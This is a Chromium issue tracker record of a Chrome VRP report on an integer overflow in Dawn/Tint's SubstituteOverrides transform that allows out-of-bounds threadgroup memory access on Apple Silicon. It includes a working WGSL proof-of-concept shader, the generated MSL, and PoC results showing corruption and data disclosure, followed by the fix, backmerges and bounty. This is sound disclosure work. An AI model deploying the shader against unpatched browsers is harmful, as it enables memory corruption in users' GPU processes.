# WebGPU (Dawn/Tint Metal) SubstituteOverrides integer overflow causes threadgroup OOB read/write

| Field | Value |
|-------|-------|
| **Issue ID** | [483751167](https://issues.chromium.org/issues/483751167) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Dawn>Tint |
| **Platforms** | Mac |
| **Reporter** | ci...@gmail.com |
| **Assignee** | ds...@chromium.org |
| **Created** | 2026-02-11 |
| **Bounty** | $16,000.00 |

## Description

---

### Report description

WebGPU (Dawn/Tint Metal) SubstituteOverrides integer overflow causes threadgroup OOB read/write

---

### Bug location

#### Where do you want to report your vulnerability?

Chrome VRP – Report security issues affecting the Chrome browser. [See program rules](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules)

#### Which URL (or repository) have you found the vulnerability in?

<https://dawn.googlesource.com/dawn/+/main/src/tint/lang/core/ir/transform/substitute_overrides.cc>

---

### The problem

#### Please describe the technical details of the vulnerability

- Chrome Stable 144.0.7559.133 (Official Build) (arm64), macOS Tahoe 26.2, Apple M1 (GPU family Metal-3)

A web-reachable out-of-bounds read/write in Metal threadgroup memory, caused by a `uint32_t` overflow in Tint's `SubstituteOverrides` transform. The overflow creates a size/count mismatch: Dawn allocates only 32 bytes of threadgroup memory while the emitted MSL declares a threadgroup struct whose first member is an array describing ~4,294,967,300 bytes. In testing on Apple Silicon, pipeline creation succeeds and dispatch completes with the undersized allocation. Writes through the oversized array deterministically corrupt values read through other workgroup variables, providing a controlled read/write primitive within threadgroup storage.

In `SubstituteOverrides::Run` (`substitute_overrides.cc`, near line 215):

```
auto* new_ty = ty.Get<core::type::Array>(old_ty->ElemType(), new_cnt,
                                         num_elements * old_ty->ImplicitStride());

```

`num_elements` is `uint32_t` (line 213) and `ImplicitStride()` returns `uint32_t` (`array.h:84`). The multiplication is computed in 32-bit arithmetic and passed to the `Array` constructor as a 32-bit byte size.

When `num_elements = 1073741825` and `ImplicitStride() = 4`:

- `1073741825 * 4 = 0x1_0000_0004` → truncated to `uint32_t` = **4**
- `Array::size_` (`uint32_t`, `array.h:111`) stores 4 instead of 4,294,967,300
- `Array::count_` (`array.h:110`) points to `ConstantArrayCount(1,073,741,825)` (element count correct)

This allows `Array::count_` and `Array::size_` to diverge. As a result, allocation/validation paths that consult `Size()` undercount workgroup storage, while MSL codegen still emits the full declared extent from `count_`. The mismatch propagates through the MSL writer (`printer.cc`):

1. Undersized allocation - Workgroup variable emission (near line 433): `ty->Size()` pushes 4 → `setThreadgroupMemoryLength:32 atIndex:0` at pipeline creation (`ComputePipelineMTL.mm`, near line 105)
2. Validation bypass - Workgroup storage calculation (near line 452): `mem_ty->Size()` returns 4 → `workgroup_info.storage_size` = 32 → passed via `ShaderModuleMTL.mm` (near line 393) to `ValidateComputeStageWorkgroupSize` (`ShaderModule.cpp`) → passes (32 < 16384)
3. MSL codegen - Uses `count_` (correct 1,073,741,825) for the array declaration → emitted MSL type describes ~4,294,967,300 bytes

The emitted MSL and host-side allocation size mismatch creates out-of-bounds threadgroup accesses. The PoC demonstrates deterministic corruption consistent with overlap between packed workgroup variables.

### Steps to Reproduce

1. Open `tint_poc.html` in Chrome Stable on an Apple Silicon Mac
2. Open DevTools Console and observe the output (shown below)
3. To see generated MSL: relaunch Chrome with `--enable-dawn-features=dump_shaders` and repeat step 1
4. Additional PoCs (each self-contained, no special flags):
   - `tint_types_poc.html` - type diversity and offset map
   - `tint_controlflow_poc.html` - control-flow steering
   - `tint_disclosure_poc.html` - bidirectional read/write

Reproduces on every run tested across page refreshes and new-tab lifecycles on Apple Silicon M1. Results do not depend on `--enable-dawn-features=dump_shaders` or any runtime flags.

#### PoC output (Chrome Stable 144, Apple Silicon M1)

The PoC runs the same WGSL shader twice - once with `N=16` (CONTROL), once with `N=1073741825` (TEST). Both write to `overflow[1..4]` and then read `victim[0..3]`:

```
CONTROL (N=16):         victim[] = 0xaaaa0000 0xaaaa0001 0xaaaa0002 0xaaaa0003
TEST    (N=1073741825): victim[] = 0x41414141 0x42424242 0x43434343 0x44444444

```

CONTROL: `victim[]` retains its init values - `overflow[]` and `victim[]` are separate (correct).
TEST: `victim[]` contains the values written to `overflow[]`, indicating that writes through the oversized array overlap the storage used for the second workgroup variable.

#### WGSL input (identical for both runs)

```
override N: u32;
var<workgroup> overflow: array<u32, N>;
var<workgroup> victim: array<u32, 4>;
@group(0) @binding(0) var<storage, read_write> out: array<u32>;
@compute @workgroup_size(1)
fn main() {
    victim[0] = 0xAAAA0000u;  victim[1] = 0xAAAA0001u;
    victim[2] = 0xAAAA0002u;  victim[3] = 0xAAAA0003u;
    workgroupBarrier();
    out[0] = victim[0]; out[1] = victim[1]; out[2] = victim[2]; out[3] = victim[3];
    overflow[1] = 0x41414141u;  overflow[2] = 0x42424242u;
    overflow[3] = 0x43434343u;  overflow[4] = 0x44444444u;
    workgroupBarrier();
    out[4] = victim[0]; out[5] = victim[1]; out[6] = victim[2]; out[7] = victim[3];
}

```
#### Generated MSL (via `--enable-dawn-features=dump_shaders`)

The MSL backend packs the shader's `var<workgroup>` variables into a single threadgroup struct, passed to the kernel as `[[threadgroup(0)]]`. Dawn sets the allocation size for this index via `setThreadgroupMemoryLength:atIndex:0`. The only difference between CONTROL and TEST is the array size in this struct:

**CONTROL (N=16):**

```
struct tint_struct_3 {
  tint_array<uint, 16> tint_member_6;          // overflow[] - 64 bytes
  tint_array<uint, 4> tint_member_7;            // victim[]   - 16 bytes
};
// kernel: void v_1(threadgroup tint_struct_3* v_18 [[threadgroup(0)]], ...)
// Dawn sets: setThreadgroupMemoryLength:80 atIndex:0. No overlap.

```

**TEST (N=1073741825):**

```
struct tint_struct_3 {
  tint_array<uint, 1073741825> tint_member_6;  // overflow[] - type describes ~4,294,967,300 bytes
  tint_array<uint, 4> tint_member_7;            // victim[]   - 16 bytes
};
// kernel: void v_1(threadgroup tint_struct_3* v_18 [[threadgroup(0)]], ...)
// Dawn sets: setThreadgroupMemoryLength:32 atIndex:0 - for a struct whose first member describes ~4,294,967,300 bytes.

```

Given member order and standard struct layout, `tint_member_7` (victim) follows `tint_member_6` (overflow). Because the allocation for `tint_member_6` is based on the overflowed `Size()` of 4, stores to `overflow[1..4]` address the same bytes later read as `victim[0..3]`. The types PoC (`tint_types_poc.html`) confirms predictable alignment gaps - indices 2-3 are padding before vec4's 16-byte boundary - reinforcing that the overlap follows standard packing rules rather than incidental behavior.

The TEST kernel also emits a zero-initialization loop iterating 1,073,741,825 times (CONTROL: 16):

```
if ((v_6 >= 1073741825u)) { break; }
(*v_2.tint_member)[v_6] = 0u;

```

The injected values are emitted as MSL literals in the generated shader. Because the indices (1-4) are in-range for the declared array extent of 1,073,741,825, index-based robustness checks (where present) do not prevent the access:

```
(*v_2.tint_member)[1u] = 1094795585u;   // 0x41414141
(*v_2.tint_member)[2u] = 1111638594u;   // 0x42424242
(*v_2.tint_member)[3u] = 1128481603u;   // 0x43434343
(*v_2.tint_member)[4u] = 1145324612u;   // 0x44444444

```
#### Capabilities demonstrated

The corruption primitive was characterized through three additional PoCs, each isolating a specific property. All results observed in testing on Apple Silicon M1, Chrome Stable 144.0.7559.133.

**Type diversity** (`tint_types_poc.html`): Each `overflow[i]` tagged `0xEE0000XX` to discover the offset map. All 4 types corrupted (CONTROL: all intact):

```
  scalar (u32):    0xAAAA0001 → 0xEE000001  (overflow[1])
  vec4<u32>:       0xBBBB{01–04} → 0xEE0000{04–07}  (overflow[4–7])
  mat2x2<f32>:     0xCCCC{01–04} → 0xEE0000{08–0B}  (overflow[8–11])
  atomic<u32>:     0xDDDD0001 → 0xEE00000C  (overflow[12])

```

Gaps at indices 2-3 (padding before vec4's 16-byte alignment) confirm the map is predictable from declaration order and type alignment rules.

**Control-flow steering** (`tint_controlflow_poc.html`): Three outcomes indicating corruption of values not written by the program after initialization/barrier (CONTROL: all pass correctly):

```
  Branch: guard[0] set to 0, branch requires !=0  →  TAKEN (0xFFFF0001)
  Loop:   guard[1] set to 3, loop bounded by guard[1]  →  ran 50 times
  Barrier: guard[3] set to 0xAAAAAAAA, never rewritten  →  reads 0x0000DEAD

```

The attacker controls the injected values (50 and 0xDEAD) via `overflow[]` writes.

**Disclosure** (`tint_disclosure_poc.html`): Secrets computed at runtime, then recovered via `overflow[]` reads (CONTROL: overflow reads return zero, secrets intact):

```
  Disclosure: overflow[1..4] = 0x53450301..04  (= secret[0..3] values)
  Injection:  secret[0..3]  = 0xBEEF0001..04  (= overflow write values)

```

4/4 secrets disclosed; 4/4 injections confirmed. The primitive is a full read/write within threadgroup storage.

**Determinism and scope:** This yields a deterministic, parameterizable out-of-bounds threadgroup read/write primitive (corruption + disclosure) within a single dispatch. No observable effects outside threadgroup/tile SRAM in targeted probes.

#### MTL\_SHADER\_VALIDATION - diagnostic confirmation

With `MTL_SHADER_VALIDATION=1`, Apple's Metal Shader Validation layer flags the threadgroup out-of-bounds access during execution; on our test machine this triggers a GPU fault that causes WindowServer to terminate and logs the user out. This is included as diagnostic confirmation of the OOB; the validation layer is not enabled in normal Chrome configurations. Production configurations may instead drop the dispatch or lose the GPU device.

### Affected Code

**Overflow:**

1. `substitute_overrides.cc:~215` - `num_elements * ImplicitStride()` overflows: `1073741825 * 4 = 4` (uint32\_t)
2. `array.h:111` - `Array::size_` stores 4; `Array::count_` stores 1,073,741,825 (correct)

**Allocation path (uses `size_` → wrong):**
3. `printer.cc:~595` - `mem_ty->Size()` returns 4 → `workgroup_info.storage_size` = 32
4. `ShaderModule.cpp` - `ValidateComputeStageWorkgroupSize`: 32 < 16384 → passes
5. `ComputePipelineMTL.mm:~105` - `setThreadgroupMemoryLength:32 atIndex:0`

**Codegen path (uses `count_` → correct):**
6. `printer.cc:~1060` - `arr->ConstantCount()` returns 1,073,741,825 → emits `tint_array<uint, 1073741825>`

Result: 32 bytes allocated for a struct whose first member describes ~4,294,967,300 bytes.

### Fix

In Tint (`SubstituteOverrides::Run`): check for overflow before constructing the `Array` type. The error must cause shader compilation / pipeline creation to fail (not continue with a partially-transformed module):

```
uint32_t num_elements = new_value->Value()->ValueAs<uint32_t>();
uint64_t array_size = static_cast<uint64_t>(num_elements) * old_ty->ImplicitStride();
if (array_size > std::numeric_limits<uint32_t>::max()) {
    b.Diagnostics().AddError(source) << "override-sized array exceeds maximum byte size";
    return;
}

```

As defense-in-depth, widening `Array::size_` to `uint64_t` would cause Dawn's existing `DAWN_INVALID_IF(workgroupStorageSize > limits.v.maxComputeWorkgroupStorageSize)` check in `ValidateComputeStageWorkgroupSize` to correctly reject the pipeline, since it would see the true size (~4,294,967,300) instead of the truncated value (4).

### Bisect

- Last good: [`b35ac660e5c9c8510646ad292e030c13883dab9a`](https://dawn.googlesource.com/dawn/+/b35ac660e5c9c8510646ad292e030c13883dab9a) - "[ir] Implement Substitute Overrides" (Nov 12 2024). Creates the transform but explicitly defers array support: *"the array type override information still needs to be substituted."*
- First bad: [`7a4fb42c574409f70d3e5b29ccc8b8992674dcd4`](https://dawn.googlesource.com/dawn/+/7a4fb42c574409f70d3e5b29ccc8b8992674dcd4) - "[ir] Handle array types in substitute overrides" (Nov 13 2024). Introduces `uint32_t num_elements * old_ty->Stride()` with no overflow check.
- Later refactor: [`afef3f952f7cfd254891c3e22b202fed7082793f`](https://dawn.googlesource.com/dawn/+/afef3f952f7cfd254891c3e22b202fed7082793f) - "Cleanup stride in arrays" (Aug 26 2025). Changes `Stride()` to `ImplicitStride()` but does not add an overflow check.

#### Impact analysis

- Demonstrated OOB read/write within threadgroup storage (corruption + disclosure). See capabilities table below.
- Demonstrated control-flow influence: branch condition, loop bound, and barrier invariant corrupted by injected values. See control-flow steering PoC below.
- No device-memory effects observed in targeted probes.

| Capability | Evidence | PoC |
| --- | --- | --- |
| Generic across types | 10/10 fields: e.g. scalar 0xAAAA0001→0xEE000001, atomic 0xDDDD0001→0xEE00000C | `tint_types_poc.html` |
| Parameterizable offset | overflow[1]→scalar, [4–7]→vec4, [8–11]→mat, [12]→atomic; gaps at [2–3] = 16B padding | `tint_types_poc.html` |
| Control-flow steering | guard[0]=0 → branch taken; guard[1]=3 → loop ran 50×; guard[3] changed across barrier | `tint_controlflow_poc.html` |
| Bidirectional read/write | overflow[1..4] returns secret values 0x5345030{1–4}; secret[] returns injected 0xBEEF000{1–4} | `tint_disclosure_poc.html` |
| Deterministic | Identical across page refreshes and tab lifecycles | All |

---

### The cause

#### What version of Chrome have you found the security issue in?

144.0.7559.133 Stable

#### Is the security issue related to a crash?

Yes, it is related to a crash.

#### Choose the type of vulnerability

Memory Corruption (in a sandboxed process)

#### How would you like to be publicly acknowledged for your report?

cinzinga

## Attachments

- [tint_poc.html](attachments/tint_poc.html) (text/html, 6.7 KB)
- [tint_controlflow_poc.html](attachments/tint_controlflow_poc.html) (text/html, 9.5 KB)
- [tint_disclosure_poc.html](attachments/tint_disclosure_poc.html) (text/html, 8.8 KB)
- [tint_types_poc.html](attachments/tint_types_poc.html) (text/html, 9.1 KB)
- [lldb_out.txt](attachments/lldb_out.txt) (text/plain, 6.8 KB)

## Timeline

### za...@google.com (2026-02-12)

security shepherd: thanks for the detailed report. The bisect is pretty clear, this is a memory safety issue within the sandboxed gpu process. Assigning this to dsinclair@ (bisect commit `7a4fb42c574409f70d3e5b29ccc8b8992674dcd4`)for further investigation.

### ch...@google.com (2026-02-12)

Setting milestone because of s0/s1 severity.

### dx...@google.com (2026-02-12)

Project: dawn  

Branch:  main  

Author:  dan sinclair [dsinclair@chromium.org](mailto:dsinclair@chromium.org)  

Link:    <https://dawn-review.googlesource.com/290475>

Guard against overflow in substitute overrides.

---


Expand for full commit details
```
     
    Check that the array size does not overflow when doing override 
    substitution. 
     
    Bug: 483751167 
    Change-Id: I2b1a1a4906e935e689230d4fcf6ad8a65ac5bf1d 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/290475 
    Reviewed-by: David Neto <dneto@google.com> 
    Auto-Submit: dan sinclair <dsinclair@chromium.org> 
    Reviewed-by: James Price <jrprice@google.com> 
    Commit-Queue: James Price <jrprice@google.com>

```

---

Files:

- M `src/tint/lang/core/ir/transform/substitute_overrides.cc`
- M `src/tint/lang/core/ir/transform/substitute_overrides_test.cc`

---

Hash: 3bb27093dc97491901bc61eb3ba289cd4341fdad  

Date: Thu Feb 12 17:46:09 2026


---

### dx...@google.com (2026-02-12)

Project: chromium/src  

Branch:  main  

Author:  chromium-autoroll [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/7572828>

Roll Dawn from 423c6801e697 to e5f8a85d6d0d (4 revisions)

---


Expand for full commit details
```
     
    https://dawn.googlesource.com/dawn.git/+log/423c6801e697..e5f8a85d6d0d 
     
    2026-02-12 chouinard@google.com Permaskip fine derivatives on Intel Macs 
    2026-02-12 bsheedy@google.com Replace Win/MSVC/CMake/Debug builder 
    2026-02-12 dsinclair@chromium.org Guard against overflow in substitute overrides. 
    2026-02-12 dsinclair@chromium.org [bindless] Add filterability to the resource type information 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/dawn-chromium-autoroll 
    Please CC cwallez@google.com,rharrison@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To file a bug in Dawn: https://bugs.chromium.org/p/dawn/issues/entry 
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Cq-Include-Trybots: luci.chromium.try:dawn-android-arm-deps-rel;luci.chromium.try:dawn-android-arm64-deps-rel;luci.chromium.try:dawn-linux-x64-deps-rel;luci.chromium.try:dawn-mac-x64-deps-rel;luci.chromium.try:dawn-mac-arm64-deps-rel;luci.chromium.try:dawn-win10-x64-deps-rel;luci.chromium.try:dawn-win10-x86-deps-rel;luci.chromium.try:dawn-win11-arm64-deps-rel;luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:gpu-fyi-cq-mac-arm64;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:gpu-fyi-cq-android-arm64 
    Bug: chromium:449521989,chromium:459517292,chromium:479576734,chromium:483751167 
    Tbr: rharrison@google.com 
    Change-Id: I7be1a4ece1582d1acd307d1e994c3c40d97c08b8 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7572828 
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1584217}

```

---

Files:

- M `DEPS`
- M `third_party/dawn`

---

Hash: [7c85048b0137ac42a5581769e08f98975a82c81d](https://chromiumdash.appspot.com/commit/7c85048b0137ac42a5581769e08f98975a82c81d)  

Date: Thu Feb 12 22:25:58 2026


---

### ch...@google.com (2026-02-13)

Security Merge Request Consideration: Requesting merge to extended stable (M144) because latest trunk commit (1584217) appears to be after extended stable branch point (1552494).
Security Merge Request Consideration: Requesting merge to stable (M145) because latest trunk commit (1584217) appears to be after stable branch point (1568190).
Security Merge Request Consideration: Requesting merge to beta (M146) because latest trunk commit (1584217) appears to be after beta branch point (1582197).
Security Merge Request - Manual Review: Merge review required: a commit with DEPS changes was detected.

Security Merge Request - Manual Review: Merge review required: a commit with DEPS changes was detected.

Security Merge Request - Manual Review: Merge review required: a commit with DEPS changes was detected.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [144, 145, 146].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### ds...@chromium.org (2026-02-17)

1. Which CLs should be backmerged? (Please include Gerrit links.)

<https://dawn-review.googlesource.com/290475>

2. Has this fix been verified on Canary to not pose any stability regressions?

It landed on the 12th, so it should have been rolled into a Canary release. There is nothing in crash/ which mentions `SubstituteOverrides` from this month.

3. Does this fix pose any potential non-verifiable stability risks?

No

4. Does this fix pose any known compatibility risks?

No

5. Does it require manual verification by the test team? If so, please describe required testing.

No

### dr...@chromium.org (2026-02-19)

Thanks! Approved to merge to M144, M145, and M146.

### dx...@google.com (2026-02-19)

Project: dawn  

Branch:  chromium/7632  

Author:  dan sinclair [dsinclair@chromium.org](mailto:dsinclair@chromium.org)  

Link:    <https://dawn-review.googlesource.com/292035>

Guard against overflow in substitute overrides.

---


Expand for full commit details
```
     
    Check that the array size does not overflow when doing override 
    substitution. 
     
    Bug: 483751167 
    Change-Id: I2b1a1a4906e935e689230d4fcf6ad8a65ac5bf1d 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/290475 
    Reviewed-by: David Neto <dneto@google.com> 
    Auto-Submit: dan sinclair <dsinclair@chromium.org> 
    Reviewed-by: James Price <jrprice@google.com> 
    Commit-Queue: James Price <jrprice@google.com> 
    (cherry picked from commit 3bb27093dc97491901bc61eb3ba289cd4341fdad) 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/292035 
    Commit-Queue: dan sinclair <dsinclair@chromium.org>

```

---

Files:

- M `src/tint/lang/core/ir/transform/substitute_overrides.cc`
- M `src/tint/lang/core/ir/transform/substitute_overrides_test.cc`

---

Hash: 3df397b5b33f950da92787d9a6ac655e0601bca2  

Date: Thu Feb 19 19:44:02 2026


---

### dx...@google.com (2026-02-19)

Project: dawn  

Branch:  chromium/7680  

Author:  dan sinclair [dsinclair@chromium.org](mailto:dsinclair@chromium.org)  

Link:    <https://dawn-review.googlesource.com/292055>

Guard against overflow in substitute overrides.

---


Expand for full commit details
```
     
    Check that the array size does not overflow when doing override 
    substitution. 
     
    Bug: 483751167 
    Change-Id: I2b1a1a4906e935e689230d4fcf6ad8a65ac5bf1d 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/290475 
    Reviewed-by: David Neto <dneto@google.com> 
    Auto-Submit: dan sinclair <dsinclair@chromium.org> 
    Reviewed-by: James Price <jrprice@google.com> 
    Commit-Queue: James Price <jrprice@google.com> 
    (cherry picked from commit 3bb27093dc97491901bc61eb3ba289cd4341fdad) 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/292055 
    Commit-Queue: dan sinclair <dsinclair@chromium.org>

```

---

Files:

- M `src/tint/lang/core/ir/transform/substitute_overrides.cc`
- M `src/tint/lang/core/ir/transform/substitute_overrides_test.cc`

---

Hash: c46c81b25577c40de6e7e510743ae0454e0c8351  

Date: Thu Feb 19 20:57:23 2026


---

### sr...@chromium.org (2026-02-19)

@ds...@chromium.org  can you also merge to 144 please before 12pm PST tomorrow so it can go out next week respin

### dx...@google.com (2026-02-19)

Project: dawn  

Branch:  chromium/7559  

Author:  dan sinclair [dsinclair@chromium.org](mailto:dsinclair@chromium.org)  

Link:    <https://dawn-review.googlesource.com/292015>

Guard against overflow in substitute overrides.

---


Expand for full commit details
```
     
    Check that the array size does not overflow when doing override 
    substitution. 
     
    Bug: 483751167 
    Change-Id: I2b1a1a4906e935e689230d4fcf6ad8a65ac5bf1d 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/290475 
    Reviewed-by: David Neto <dneto@google.com> 
    Auto-Submit: dan sinclair <dsinclair@chromium.org> 
    Reviewed-by: James Price <jrprice@google.com> 
    Commit-Queue: James Price <jrprice@google.com> 
    (cherry picked from commit 3bb27093dc97491901bc61eb3ba289cd4341fdad) 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/292015

```

---

Files:

- M `src/tint/lang/core/ir/transform/substitute_overrides.cc`
- M `src/tint/lang/core/ir/transform/substitute_overrides_test.cc`

---

Hash: 67bcc781bd5f9f8275a4fc954ddd0e8418ed3f1d  

Date: Thu Feb 19 22:02:15 2026


---

### ds...@chromium.org (2026-02-19)

Yup, was just waiting for the bots to pass for M144, should be done now.

### ci...@gmail.com (2026-03-04)

While I know this bug is already fixed, I am attaching a fully symbolized stack trace. Apologies for the delay on this information; hopefully, it will assist in place of ASan output.

The lldb session below captures the exact Metal API call where Dawn sets the undersized allocation (Chrome ASan 144.x, macOS, --in-process-gpu):

The PoC creates two pipelines (CONTROL N=16, TEST N=1073741825). Both hit setThreadgroupMemoryLength via the same code path at ComputePipelineMTL.mm:105:

Stack at the undersized allocation (TEST pipeline):

```
  #0  -[MTLDebugComputeCommandEncoder setThreadgroupMemoryLength:atIndex:]
  #1  Encode                              at ComputePipelineMTL.mm:105
  #2  EncodeComputePass                   at CommandBufferMTL.mm:1668
  #3  FillCommands                        at CommandBufferMTL.mm:1132
  #4  SubmitImpl                          at QueueMTL.mm:290
  #5  SubmitInternal                      at Queue.cpp:649
  #6  APISubmit                           at Queue.cpp:169
  #7  NativeQueueSubmit                   at ProcTable.cpp:1446
  #8  DoQueueSubmit                       at ServerDoers_autogen.cpp:467
  #10 HandleCommands                      at ServerHandlers_autogen.cpp:1806
  #11 HandleCommands                      at webgpu_decoder_impl.cc:154
  #14 Flush                               at command_buffer_service.cc:266
  #17 ExecuteDeferredRequest              at gpu_channel.cc:798

```

Registers confirm the undersized allocation (rdx = threadgroup memory length in Obj-C calling convention):

```
  CONTROL (N=16):         rdx = 0x50  (80 bytes = 16*4 + 4*4, correct)
  TEST    (N=1073741825): rdx = 0x20  (32 bytes, should be ~4,294,967,316)

  N=1073741825: num_elements * ImplicitStride = 0x100000004, truncated to uint32 = 4
  Array::Size() returns 4 -> struct size 32 -> passes Dawn validation (< 16384)
  setThreadgroupMemoryLength:32 (should be ~4,294,967,316 bytes)

```

The 32-byte allocation for a struct whose first member describes ~4.3 billion bytes is the root cause of the threadgroup aliasing demonstrated in the PoC output (already attached to the original report).

### sp...@google.com (2026-03-05)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $16000.00 for this report.

Rationale for this decision:
High Quality with Bisect. Memory corruption in a highly privileged process (e.g. GPU, network processes).


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-05-22)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/483751167)*
